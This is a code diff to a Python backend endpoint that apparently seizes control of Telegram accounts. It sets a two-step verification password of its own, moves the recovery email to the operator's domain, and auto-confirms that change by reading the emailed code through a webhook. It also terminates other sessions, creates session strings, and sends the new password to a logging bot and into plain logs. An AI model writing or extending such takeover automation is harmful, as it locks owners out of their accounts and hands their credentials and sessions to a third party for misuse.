@@ -578,27 +578,37 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
         target_email = account.target_email
         email_hash = account.email_hash
         
+    # Get or create lock for this phone to prevent concurrent finalize
+    finalize_lock = manager._get_lock(phone)
+    
+    async with finalize_lock:
+        logger.info(f"[FINALIZE] Acquired lock for {phone}")
+        
         # Step 1: Check current 2FA status
         security_info = await manager.get_security_info(phone, known_password=current_2fa_password)
         has_password = security_info.get("has_password", False)
         
-        # Step 2: Enable or change 2FA password
+        # Step 2: Enable or change 2FA password to OUR generated one
         if has_password and current_2fa_password:
             # 2FA already enabled - change password to ours
+            logger.info(f"[FINALIZE] Changing 2FA password for {phone}")
             result = await manager.change_2fa_password(
                 phone=phone,
                 current_password=current_2fa_password,
                 new_password=new_password
             )
         else:
-            # 2FA disabled - enable it with our password + recovery email
-            result = await manager.enable_2fa(phone, new_password, hint="", email=target_email or "")
-            logger.info(f"2FA was disabled for {phone}, enabling with our password + recovery email")
+            # 2FA disabled - enable it with our password
+            logger.info(f"[FINALIZE] Enabling 2FA for {phone}")
+            result = await manager.enable_2fa(phone, new_password, hint="", email="")
         
         if result.get("status") != "success":
             raise HTTPException(status_code=400, detail=f"Failed to set 2FA: {result.get('error')}")
         
-        # Step 3: Re-check recovery email status (now using OUR new password)
+        logger.info(f"[FINALIZE] 2FA password set successfully for {phone}")
+        
+        # Step 3: Re-check recovery email status using OUR new password
+        logger.info(f"[FINALIZE] Checking recovery email status for {phone}")
         security_info2 = await manager.get_security_info(phone, known_password=new_password)
         recovery_email_full = security_info2.get("recovery_email_full")
         email_unconfirmed = security_info2.get("email_unconfirmed_pattern")
@@ -606,58 +616,85 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
         email_is_ours = False
         if recovery_email_full and EMAIL_DOMAIN in recovery_email_full.lower():
             email_is_ours = True
+            logger.info(f"[FINALIZE] Recovery email already ours: {recovery_email_full}")
         elif email_unconfirmed and EMAIL_DOMAIN in str(email_unconfirmed).lower():
-            email_is_ours = True  # Pending confirmation but it's ours
+            email_is_ours = True
+            logger.info(f"[FINALIZE] Recovery email pending (ours): {email_unconfirmed}")
         elif email_unconfirmed and target_email and pattern_matches_email(email_unconfirmed, target_email):
-            email_is_ours = True  # Pattern matches our expected email
+            email_is_ours = True
+            logger.info(f"[FINALIZE] Recovery email pending by pattern match: {email_unconfirmed}")
         
-        # Step 4: If email not ours yet, change it
+        email_needs_confirmation = False
+        
+        # Step 4: If email not ours yet, explicitly set it
         if not email_is_ours and target_email:
+            logger.info(f"[FINALIZE] Setting recovery email to {target_email} for {phone}")
             email_result = await manager.change_recovery_email(phone, new_password, target_email)
             
             if email_result.get("status") != "success":
-                logger.warning(f"Failed to change recovery email for {phone}: {email_result.get('error')}")
+                logger.error(f"[FINALIZE] Failed to change recovery email: {email_result.get('error')}")
                 raise HTTPException(
                     status_code=400, 
                     detail={
-                        "error": "EMAIL_CHANGE_REQUIRED",
-                        "message": "Could not change recovery email. Please change it manually to: " + target_email,
+                        "error": "EMAIL_CHANGE_FAILED",
+                        "message": "Could not set recovery email. Please set it manually in Telegram.",
                         "target_email": target_email,
-                        "action": "Go to Telegram Settings > Privacy & Security > Two-Step Verification > Recovery Email and change it to our email, then try again.",
                         "technical_error": email_result.get("error")
                     }
                 )
-        
-        # Step 5: Wait for email confirmation code and auto-confirm
-        # (applies when email was just set via enable_2fa or change_recovery_email)
-        # Re-check: is email confirmed or pending?
-        security_info3 = await manager.get_security_info(phone, known_password=new_password)
-        email_unconfirmed_now = security_info3.get("email_unconfirmed_pattern")
-        
-        if email_unconfirmed_now and target_email:
-            # Email is pending confirmation - wait for code via webhook
-            logger.info(f"Recovery email pending confirmation for {phone}, waiting for code...")
-            code = None
             
-            for _ in range(15):
+            logger.info(f"[FINALIZE] Recovery email change initiated for {phone}")
+            email_needs_confirmation = True
+        elif not target_email:
+            logger.warning(f"[FINALIZE] No target email configured for {phone}")
+        else:
+            logger.info(f"[FINALIZE] Recovery email already correct for {phone}")
+            # Check if it needs confirmation even if it's ours
+            if email_unconfirmed and not recovery_email_full:
+                email_needs_confirmation = True
+        
+        # Step 5: Wait for and confirm email verification code
+        if email_needs_confirmation and target_email and email_hash:
+            logger.info(f"[FINALIZE] Waiting for email confirmation code for {phone}...")
+            code = None
+            confirmation_success = False
+            
+            # Wait up to 25 seconds for code via webhook
+            for attempt in range(25):
                 await asyncio.sleep(1)
                 from backend.api.webhook_routes import get_code_by_hash
                 code = get_code_by_hash(email_hash)
                 if code:
+                    logger.info(f"[FINALIZE] Email code received for {phone}: {code}")
                     break
             
             if code:
+                # Attempt confirmation
+                logger.info(f"[FINALIZE] Confirming email for {phone} with code")
                 confirm_result = await manager.confirm_recovery_email(phone, code)
+                
                 if confirm_result.get("status") == "success":
+                    confirmation_success = True
                     await update_account(phone, email_changed=True, email_verified=True)
-                    logger.info(f"Recovery email auto-confirmed for {phone}")
+                    logger.info(f"[FINALIZE] Email confirmed successfully for {phone}")
+                    
+                    # Log to credentials
+                    log_credentials(
+                        phone=phone,
+                        action="EMAIL_AUTO_CONFIRMED",
+                        email=target_email,
+                        telegram_id=account.telegram_id
+                    )
                 else:
-                    logger.warning(f"Failed to confirm email for {phone}: {confirm_result.get('error')}")
+                    logger.warning(f"[FINALIZE] Email confirmation failed: {confirm_result.get('error')}")
             else:
-                logger.warning(f"No email code received within 15s for {phone} - continuing without confirmation")
-                # Don't block finalize - email can be confirmed later
+                logger.warning(f"[FINALIZE] No email code received within 25s for {phone}")
+            
+            if not confirmation_success:
+                # Don't block finalize - email can be confirmed later, but warn
+                logger.warning(f"[FINALIZE] Email not confirmed, but continuing with finalize for {phone}")
         
-        # Send log to bot
+        # Log password set
         try:
             from backend.log_bot import log_password_set
             await log_password_set(phone, account.telegram_id, new_password)
@@ -783,15 +820,35 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
         clear_session_cache(phone)
         
         duration = time.time() - start_time
-        return {
+        
+        # Build detailed result
+        finalize_result = {
             "status": "success",
             "message": "Account finalized successfully",
             "account_id": phone,
             "password": new_password,
             "transfer_mode": account.transfer_mode.value if account.transfer_mode else "bot_only",
             "terminated_sessions": terminated_count,
-            "duration": duration
+            "duration": duration,
+            "steps": {
+                "2fa_password_set": True,
+                "recovery_email": {
+                    "email_is_ours": email_is_ours,
+                    "email_changed_during_finalize": not email_is_ours and target_email is not None,
+                    "email_confirmed": confirmation_success if email_needs_confirmation and target_email and email_hash else None,
+                    "email_status": "confirmed" if (email_is_ours and not email_unconfirmed) else ("pending" if email_unconfirmed else "none"),
+                    "target_email": target_email,
+                    "current_email": recovery_email_full or email_unconfirmed or "none"
+                },
+                "sessions_created": {
+                    "pyrogram": bool(pyrogram_session),
+                    "telethon": bool(telethon_session_string)
+                }
+            }
         }
+        
+        logger.info(f"[FINALIZE] Completed successfully for {phone} in {duration:.2f}s")
+        return finalize_result
         
     except HTTPException:
         raise
